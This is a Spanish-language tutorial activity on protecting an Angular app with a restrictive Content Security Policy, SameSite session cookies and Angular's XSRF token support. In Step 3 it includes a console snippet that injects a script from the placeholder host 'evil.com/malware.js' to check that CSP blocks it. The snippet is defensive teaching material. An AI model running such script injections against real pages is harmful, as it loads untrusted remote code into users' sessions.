## Por que esta actividad

Tu aplicación puede estar libre de XSS en tu propio código, pero si no tienes un **Content Security Policy (CSP)** restrictivo, un script de terceros comprometido (un CDN hackeado, un paquete npm con malware, un tag de analytics inyectado) puede ejecutar código arbitrario en tu página. CSP es como una lista blanca de fuentes permitidas: si un script no esta en la lista, el navegador lo bloquea. Por otro lado, **CSRF** ocurre cuando un sitio malicioso envia peticiones a tu API usando las cookies de sesion del usuario — sin que el usuario lo sepa. Configurar cookies con `SameSite` y tokens CSRF previene este ataque por completo.

## Antes de empezar

Necesitas tener completada la **Actividad 6.4** y una app Angular con un servidor (o proxy) que puedas configurar.

**Content Security Policy (CSP)** es un header HTTP que le dice al navegador: "solo permite cargar scripts, estilos e imagenes de estas fuentes especificas". Si un atacante logra inyectar un `<script>` que apunta a `https://evil.com/malware.js`, el navegador lo bloquea porque esa fuente no esta en tu CSP.

**CSRF (Cross-Site Request Forgery)** es un ataque donde un sitio malicioso hace que el navegador del usuario envie una petición a tu API — y como el navegador incluye las cookies automáticamente, tu servidor la procesa como si fuera legitima. Es como si alguien falsificara una carta con tu firma.

**SameSite** es un atributo de las cookies que controla cuando el navegador las envia. Con `SameSite=Strict`, las cookies solo se envian si la petición se origina desde el mismo sitio — eliminando CSRF por completo.

### Paso 1 — Configurar CSP con meta tag

Primero vamos a probar CSP con un meta tag para entender como funciona. Despues lo moveremos al servidor (que es donde debe estar en produccion).

1. Abre `src/index.html`
2. Dentro de `<head>`, agrega este meta tag:
   ```text
   <!-- HTML: agrega esto dentro de <head> -->
   <meta http-equiv="Content-Security-Policy"
         content="
           default-src 'self';
           script-src 'self';
           style-src 'self';
           img-src 'self' data:;
           font-src 'self';
           connect-src 'self';
           frame-src 'none';
           object-src 'none';
           base-uri 'self';
         ">
   ```

> 💡 **Nota:** `'self'` significa "solo desde el mismo dominio". `'none'` significa "no permitir ninguno". No estamos usando `*` (todo permitido) ni `'unsafe-inline'` (scripts inline) — ambos anulan la protección del CSP.

3. Ejecuta tu app:
   ```bash
   ng serve
   ```
4. Abre DevTools → Console. Si todo funciona sin errores, tu CSP es compatible con tu app
5. Si ves errores como `Refused to load the script...`, necesitas agregar la fuente específica a la directiva correspondiente. Por ejemplo, si usas Google Fonts:
   ```text
   font-src 'self' https://fonts.gstatic.com;
   style-src 'self' https://fonts.googleapis.com;
   ```

### Paso 2 — Configurar CSP en el servidor

El meta tag es útil para desarrollo, pero en produccion el CSP debe ser un **header HTTP**. El meta tag tiene limitaciones (no soporta `frame-ancestors`, no puede usar `report-uri`).

1. Si usas el proxy de Angular para desarrollo, crea o edita `src/proxy.conf.json`:
   ```json
   {
     "/api": {
       "target": "http://localhost:3000",
       "secure": false
     }
   }
   ```

2. Si tienes control del servidor (Express, por ejemplo), agrega el header CSP:
   ```typescript
   // En tu servidor Express (server.ts o similar)
   import helmet from 'helmet';

   app.use(
     helmet.contentSecurityPolicy({
       directives: {
         defaultSrc: ["'self'"],
         scriptSrc: ["'self'"],
         styleSrc: ["'self'"],
         imgSrc: ["'self'", "data:"],
         fontSrc: ["'self'"],
         connectSrc: ["'self'"],
         frameSrc: ["'none'"],
         objectSrc: ["'none'"],
         baseUri: ["'self'"],
       },
     })
   );
   ```

3. Si usas Angular SSR con Express, instala helmet:
   ```bash
   npm install helmet
   ```

> 💡 **Nota:** Helmet es una libreria de seguridad para Express que configura varios headers de seguridad automáticamente, incluyendo CSP. Es el estandar de la industria.

### Paso 3 — Verificar CSP en response headers

1. Abre tu app en Chrome
2. Abre DevTools → Network
3. Haz click en la petición del documento principal (la primera, la que tiene el nombre de tu dominio)
4. En la pestana **Headers**, busca la sección **Response Headers**
5. Verifica que existe el header `Content-Security-Policy`
6. Verifica que:
   - **No contiene** `*` en ninguna directiva
   - **No contiene** `'unsafe-inline'` en `script-src`
   - **No contiene** `'unsafe-eval'` en `script-src`
   - `default-src` es `'self'` o mas restrictivo

7. Prueba que CSP bloquea scripts no autorizados. En la Console de DevTools:
   ```javascript
   // Intenta inyectar un script externo — CSP debe bloquearlo
   const script = document.createElement('script');
   script.src = 'https://evil.com/malware.js';
   document.head.appendChild(script);
   ```
8. Debes ver un error en la Console: `Refused to load the script 'https://evil.com/malware.js' because it violates the following Content Security Policy directive: "script-src 'self'"` — esto confirma que tu CSP esta funcionando

### Paso 4 — Configurar SameSite cookies

1. Si tienes control del servidor, configura las cookies de sesion con `SameSite`:
   ```typescript
   // En tu servidor Express
   app.use(session({
     cookie: {
       httpOnly: true,      // No accesible desde JavaScript
       secure: true,         // Solo HTTPS
       sameSite: 'strict',   // No se envia en peticiones cross-site
       maxAge: 3600000,      // 1 hora
     },
     // ... resto de configuracion
   }));
   ```

2. En Angular, si usas `HttpClient` con `withCredentials`, el servidor debe responder con el header `Set-Cookie` que incluya `SameSite=Strict` o `SameSite=Lax`:
   ```
   Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/
   ```

3. Para verificar, abre DevTools → Application → Cookies. Selecciona tu dominio y verifica que las cookies de sesion muestren:
   - **HttpOnly**: si (columna HttpOnly con checkmark)
   - **Secure**: si
   - **SameSite**: Strict o Lax

> 💡 **Nota:** `SameSite=Strict` es mas seguro — la cookie no se envia nunca en peticiones cross-site. `SameSite=Lax` permite que la cookie se envie en navegación top-level (links), lo cual es necesario si tu app usa redirects desde otros sitios (como OAuth). Para la mayoria de APIs, `Strict` es la mejor opción.

### Paso 5 — Verificar protección CSRF

1. Si tu app usa Angular `HttpClient`, Angular tiene protección CSRF integrada. Verifica que tu servidor envia el token CSRF:
   - El servidor debe enviar una cookie llamada `XSRF-TOKEN` (este es el nombre por defecto que Angular busca)
   - Angular automáticamente lee esa cookie y la envia como header `X-XSRF-TOKEN` en cada petición mutante (POST, PUT, DELETE)

2. En Angular, `HttpClient` ya viene con `HttpXsrfModule` integrado. Verifica en DevTools → Network que las peticiones POST/PUT/DELETE incluyen el header `X-XSRF-TOKEN`

3. Si necesitas configurar nombres personalizados para la cookie y el header:
   ```typescript
   // En tu app.config.ts
   import { provideHttpClient, withXsrfConfiguration } from '@angular/common/http';

   export const appConfig = {
     providers: [
       provideHttpClient(
         withXsrfConfiguration({
           cookieName: 'MI-XSRF-TOKEN',
           headerName: 'X-MI-XSRF-TOKEN',
         })
       ),
     ],
   };
   ```

4. Si no tienes control del servidor para configurar cookies CSRF, documenta este requerimiento como pendiente para cuando trabajes con el equipo de backend

## Que puede salir mal

- **"Mi app deja de funcionar con CSP — los estilos no se aplican"** → Tailwind CSS y los estilos inline de Angular pueden necesitar `'unsafe-inline'` en `style-src`. Si usas Tailwind con classes de utilidad, no necesitas inline styles. Si usas `[style.color]="..."` en Angular, considera mover esos estilos a clases CSS. Como ultimo recurso, usa `'unsafe-inline'` solo para `style-src` (no para `script-src` — esa es la directiva critica).
- **"CSP bloquea mis imagenes de una API externa"** → Agrega el dominio específico a `img-src`: `img-src 'self' https://api.ejemplo.com;`. No uses `*` — lista cada dominio que necesitas.
- **"No veo el header Content-Security-Policy en Network"** → Si solo usaste el meta tag, el header no aparecera en Network (es un meta tag, no un header HTTP). Para verlo en Network necesitas configurarlo en el servidor.
- **"No tengo control del servidor para configurar cookies"** → Documenta los requerimientos de seguridad (SameSite, HttpOnly, Secure) y comunicalos al equipo de backend. El meta tag CSP sigue funcionando para desarrollo.

## Resultado esperado

Al terminar, tu app tiene un CSP header restrictivo que bloquea scripts, estilos y fuentes no autorizadas. Las cookies de sesion estan configuradas con `SameSite` para prevenir CSRF. Intentar cargar un script de un dominio externo falla con un error de CSP en la Console.

**Criterios de aceptacion:**
- [ ] CSP header presente — verificado en DevTools → Network → Response Headers (o meta tag en desarrollo)
- [ ] CSP no contiene `*` ni `'unsafe-inline'` para `script-src` — verificado inspeccionando el valor del header
- [ ] SameSite configurado en cookies de sesion — verificado en DevTools → Application → Cookies
- [ ] Un script externo inyectado via Console es bloqueado por CSP — verificado con el test del Paso 3
